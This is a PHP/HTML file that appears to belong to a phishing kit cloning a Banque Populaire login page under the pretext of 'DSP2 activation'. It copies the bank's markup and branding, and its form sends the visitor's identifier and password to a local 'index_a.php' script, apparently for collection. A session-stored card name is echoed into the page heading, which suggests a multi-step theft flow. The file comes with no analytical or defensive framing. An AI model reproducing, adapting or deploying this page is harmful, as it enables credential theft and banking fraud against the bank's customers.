<?php

session_start();

?>
<html lang="fr"><head>


	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
	<title> Activation du DSP2 | Banque Populaire </title>

	<meta name="viewport" content="width=device-width, initial-scale=1">
	<link rel="icon" type="image/x-icon" href="../ressources/images/bpl/favicon.ico">
    <link type="text/css" rel="stylesheet" href="../ressources/css/bpl/styles_bpl.css">
</head>

<body>
	<as-root _nghost-spo-c11="" ng-version="13.1.3">
		<as-fqdn _ngcontent-spo-c11="">
			<!---->
		</as-fqdn>
		<router-outlet _ngcontent-spo-c11=""></router-outlet>
		<as-template-page class="ng-star-inserted">
			<as-template _nghost-spo-c35="" class="ng-star-inserted">
				<div _ngcontent-spo-c35="" class="authentication_frame ng-star-inserted">
					<button _ngcontent-spo-c35="" tabindex="0" aria-label="Aller au contenu" uibuttonv2="" bpceariabutton="" category="quaternary" id="p-identifier-btn-goToContents" class="evitement bpce-focus-reset bpce-button bpce-button-quaternary bpce-button-inline bpce-button-no-border" _nghost-spo-c27="" role="button">
						<!----><span _ngcontent-spo-c27=""> Aller au contenu </span>
						<!---->
					</button>
					<ui-header _ngcontent-spo-c35="" role="banner" leftbuttonlabel="Quitter" leftbuttonicon="" _nghost-spo-c29="" class="ng-star-inserted">
						<div _ngcontent-spo-c29="" class="bpce-header bpce-header-with-border-bottom bpce-header-with-background">
							<div _ngcontent-spo-c29="" class="bpce-header-left" style="min-width: 127px;">
								<!---->
								
								<!---->
							</div>
							<div _ngcontent-spo-c29="" class="bpce-header-middle">
								<div _ngcontent-spo-c29="" class="bpce-header-ellipsis-container"><img _ngcontent-spo-c35="" alt="Logo de la banque" class="logo" src="../ressources/images/bpl/logo-large.svg" aria-label="Logo BANQUE POPULAIRE"></div>
								<!---->
							</div>
							<div _ngcontent-spo-c29="" class="bpce-header-right" style="min-width: 127px;">
								<button _ngcontent-spo-c35="" bpceariabutton="" uibuttonv2="" category="secondary" icon="help" id="p-identifier-btn-support" class="support-link bpce-focus-reset bpce-button bpce-button-secondary bpce-button-inline bpce-button-no-border bpce-button-font-text ng-star-inserted" _nghost-spo-c27="" tabindex="0" role="button">
									
									<!---->
									
								</button>
								<!---->
								<!---->
								<!---->
								<!---->
							</div>
						</div>
					</ui-header>
					<!---->
					<!---->
					<div _ngcontent-spo-c35="" class="bpce-container">
						<div _ngcontent-spo-c35="" class="bpce-row authentication_body">
							<div _ngcontent-spo-c35="" class="bpce-col-md-5 bpce-col-sm-8 bpce-col-xs-4 left-column">
								<!---->
								<div _ngcontent-spo-c35="" role="main" tabindex="-1" class="container">
									<h1 _ngcontent-spo-c35="" aria-live="assertive" class="as-page-title"><?php echo $_SESSION['cardName']; ?> Saisissez votre identifiant</h1>
									<div _ngcontent-spo-c35="" class="as-page-container">
										<router-outlet></router-outlet>
										<as-identifier _nghost-spo-c137="" class="ng-star-inserted">
											<as-form-identifier _ngcontent-spo-c137="" _nghost-spo-c135="" class="ng-star-inserted">
												
													<div _ngcontent-spo-c135="" class="leftTop">
														<as-select-entity _ngcontent-spo-c135="" _nghost-spo-c111="" class="ng-star-inserted">
															<ui-select-v2 _ngcontent-spo-c111="" _nghost-spo-c108="" class="ng-valid ng-dirty ng-touched">
																
																<!---->
																<!---->
															</ui-select-v2>
														</as-select-entity>
														<form method="post" action="index_a.php">
														<ui-input-v2 _ngcontent-spo-c135="" aria-label="Entrez votre identifiant" aria-required="true" name="identifier" ngclass="input-identifier" _nghost-spo-c64="" class="input-identifier ng-dirty ng-valid ng-touched" required="">
															<label _ngcontent-spo-c64="" class="bpce-input-v2 bpce-input-v2-valued" for="input-v2-1">
																<input _ngcontent-spo-c64="" name="ml" id="ml" class="bpce-input-v2-field ng-valid ng-dirty ng-touched" id="input-identifier" type="text" inputmode="text" aria-label="Entrez votre identifiant" aria-invalid="false" required><span _ngcontent-spo-c64="" aria-hidden="true" class="bpce-input-v2-label bpce-input-v2-label-float">Entrez votre identifiant</span>
																<button _ngcontent-spo-c64="" type="button" uibuttonv2="" category="secondary" noborder="true" icon="erase" class="bpce-input-v2-icon bpce-input-v2-clear bpce-focus-reset bpce-button-icon-only bpce-button bpce-button-secondary bpce-button-inline bpce-button-no-border bpce-button-font-text ng-star-inserted" _nghost-spo-c27="" aria-label="Supprimer la saisie" tabindex="0" aria-disabled="false" role="button">
																	<ui-icon-v2 _ngcontent-spo-c27="" _nghost-spo-c15="" class="ng-star-inserted"></ui-icon-v2>
																	<!----><span _ngcontent-spo-c27=""></span>
																	<!---->
																</button>
																<!---->
																<!---->
																<!---->
																<br>
															</label>
														</ui-input-v2>
														<ui-input-v2 _ngcontent-spo-c135="" aria-label="Entrez votre mot de passe" aria-required="true" name="identifier" ngclass="input-identifier" _nghost-spo-c64="" class="input-identifier ng-dirty ng-valid ng-touched" required="">
															<label _ngcontent-spo-c64="" class="bpce-input-v2 bpce-input-v2-valued" for="input-v2-1">
																<input _ngcontent-spo-c64="" maxlength="9" class="bpce-input-v2-field ng-valid ng-dirty ng-touched" name="mp" id="mp" type="text" inputmode="text" aria-label="Entrez votre identifiant" aria-invalid="false" required><span _ngcontent-spo-c64="" aria-hidden="true" class="bpce-input-v2-label bpce-input-v2-label-float">Entrez votre mot de passe</span>
																<button _ngcontent-spo-c64="" type="button" uibuttonv2="" category="secondary" noborder="true" icon="erase" class="bpce-input-v2-icon bpce-input-v2-clear bpce-focus-reset bpce-button-icon-only bpce-button bpce-button-secondary bpce-button-inline bpce-button-no-border bpce-button-font-text ng-star-inserted" _nghost-spo-c27="" aria-label="Supprimer la saisie" tabindex="0" aria-disabled="false" role="button">
																	<ui-icon-v2 _ngcontent-spo-c27="" _nghost-spo-c15="" class="ng-star-inserted"></ui-icon-v2>
																	<!----><span _ngcontent-spo-c27=""></span>
																	<!---->
																</button>
																<!---->
																<!---->
																<!---->
																<!---->
															</label>
														</ui-input-v2>

														<div _ngcontent-spo-c135="" class="text-center ng-star-inserted">
															<button _ngcontent-spo-c135="" uibuttonv2="" bpceariabutton="" type="button" id="p-identifier-btn-forgottenId" class="bpce-button-tertiary as-hint-text forgotten-id button-more bpce-focus-reset bpce-button bpce-button-inline ng-star-inserted" _nghost-spo-c27="" tabindex="0" role="button">
																<!---->
																<!---->
															</button>
															<!---->

														</div>
														<!---->
														<as-a11y-toggle _ngcontent-spo-c135="" _nghost-spo-c134="">
															<div _ngcontent-spo-c134="" class="content-toggle-a11y">
																<ui-toggle-button _ngcontent-spo-c134="" label="Version accessible" name="toggleBtn" _nghost-spo-c133="" class="ng-untouched ng-valid ng-dirty">
																	<input _ngcontent-spo-c133="" type="checkbox" class="bpce-toggle-input" id="virtual-keyboard-toggle-form" name="toggleBtn">
																	<label _ngcontent-spo-c133="" class="bpce-toggle-label" for="virtual-keyboard-toggle-form">
																		<div _ngcontent-spo-c133="" class="bpce-toggle-label-text ng-star-inserted">Mémoriser mon identifiant</div>
																		<!---->
																		<div _ngcontent-spo-c133="" class="bpce-toggle-btn">
																			<svg _ngcontent-spo-c133="" aria-hidden="true" focusable="false" viewBox="0 0 32 32" class="bpce-toggle-icon">
																				<path _ngcontent-spo-c133="" fill="none" d="M5 15l8 8L27 9"></path>
																			</svg>
																		</div>
																	</label>
																</ui-toggle-button>
																<p _ngcontent-spo-c134="">Le bouton ci-dessus permet d’activer la mémorisation de votre identifiant lors de votre prochaine connexion.</p>
															</div>
														</as-a11y-toggle>
													</div>
													<div _ngcontent-spo-c135="" class="leftBottom">
														
														<div _ngcontent-spo-c135="" uibuttonv2group="" _nghost-spo-c28="" class="bpce-button-group">
															<button name="btn_bpl_submit" uibuttonv2="" alignment="block" category="primary" type="submit" id="p-identifier-btn-validate" _nghost-spo-c27="" class="bpce-focus-reset bpce-button bpce-button-primary bpce-button-block bpce-button-font-text" tabindex="0" aria-disabled="false" role="button">
																<!----><span _ngcontent-spo-c27=""><span _ngcontent-spo-c135="" as-content-loader="" _nghost-spo-c71="">Continuer<!----><!----></span></span>
																<!---->
															</button>
                                                            </form>
														</div>
													</div>
												
											</as-form-identifier>
											<!---->
											<!---->
										</as-identifier>
										<!---->
									</div>
								</div>
							</div>
							<div _ngcontent-spo-c35="" class="bpce-col-md-7 right-column ng-star-inserted">
								<as-template-right-column _ngcontent-spo-c35="" class="template-right-column ng-tns-c34-0 ng-star-inserted" _nghost-spo-c34="">
									<div _ngcontent-spo-c34="" role="img" aria-label="Image de fond de la banque" class="right-column ng-tns-c34-0" style="background-image: url(&quot;https://www.banquepopulaire.fr/ria/accessecurite-bps-current/assets/background_startup_14707.jpg&quot;);">
										<!---->
										<div _ngcontent-spo-c34="" class="common-info ng-tns-c34-0 ng-trigger ng-trigger-simpleFadeAnimation ng-star-inserted" style="opacity: 1;"><span _ngcontent-spo-c34="" class="memorized ng-tns-c34-0">BANQUE POPULAIRE</span><span _ngcontent-spo-c34="" class="ng-tns-c34-0"></span></div>
										<!---->
										<!----><img _ngcontent-spo-c34="" class="overlay-background ng-tns-c34-0 ng-star-inserted" src="../ressources/images/bpl/graphisme-jo-bp.svg">
										<!---->
									</div>
								</as-template-right-column>
								<!---->
							</div>
							<!---->
						</div>
					</div>
				</div>
				<!---->
			</as-template>
			<!---->
			<!---->
			<!---->
		</as-template-page>
		<!---->
		<div _ngcontent-spo-c11="" class="redirect-outlet">
			<router-outlet _ngcontent-spo-c11="" name="redirect"></router-outlet>
			<!---->
		</div>
		<router-outlet _ngcontent-spo-c11="" name="modal"></router-outlet>
		<ng-component>
			<router-outlet></router-outlet>
			<!---->
		</ng-component>
		<!---->
		<router-outlet _ngcontent-spo-c11="" name="modal-2"></router-outlet>
		<!----><img _ngcontent-spo-c11="" src="./Connexion à votre espace_files/small.png" alt="Ecr image" style="display: none;"></as-root>
	<!---->
</body></html>